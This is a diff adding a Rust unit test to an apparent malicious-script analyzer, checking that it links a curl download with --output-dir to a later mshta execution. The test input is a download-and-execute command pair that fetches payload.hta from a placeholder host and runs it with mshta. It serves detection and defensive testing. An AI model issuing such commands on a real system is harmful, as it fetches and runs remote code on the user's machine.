@@ -10022,6 +10022,41 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn curl_output_dir_applies_to_relative_output_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl --output-dir C:\Temp -o stage.hta https://curl-output-dir-o.example/payload.hta
+mshta C:\Temp\stage.hta"#,
+            &Config::default(),
+        );
+        let has_download_dst = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-output-dir-o.example/payload.hta"
+                        && dst == r#"C:\Temp\stage.hta"#
+            )
+        });
+        assert!(
+            has_download_dst,
+            "curl --output-dir did not join relative -o destination: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == r#"mshta C:\Temp\stage.hta"#
+                        && url == "https://curl-output-dir-o.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "curl --output-dir relative -o destination was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_without_output_records_src_only() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl http://x/y", &mut env);
